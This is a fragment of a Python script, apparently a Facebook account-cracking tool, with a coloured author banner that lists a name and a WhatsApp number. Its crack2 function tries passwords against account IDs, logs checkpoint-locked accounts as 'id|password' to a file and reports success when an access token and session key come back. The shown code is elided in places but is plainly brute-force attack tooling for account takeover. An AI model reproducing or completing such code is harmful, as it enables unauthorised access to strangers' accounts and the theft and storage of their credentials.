...
##     ## ##     ## ########       
\x1b[92;1m===================================>\x1b[92;1m
\x1b[93;1m Author       \x1b[92;1m=>      \x1b[93;1mAzan Ali
\x1b[93;1m Whatsapp     \x1b[92;1m=>      \x1b[93;1m+923165456679
\x1b[93;1m YouTube       \x1b[92;1m=>      \x1b[93;1mError
\x1b[92;1m===================================>\x1b[92;1m
"""%(h))
...
def crack2(idf,pwv):
	...
	fff = '%'
	print('\r%s [AXB] %s/%s  OK*%s | CP*%s => %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
		...
		try:
			...
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					...
					print('\r%s [CHECKPOINT] %s|%s        '%(b,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAB" in resp.text:
				print('\r%s [SUCCESSFUL] %s|%s        '%(h,idf,pw))
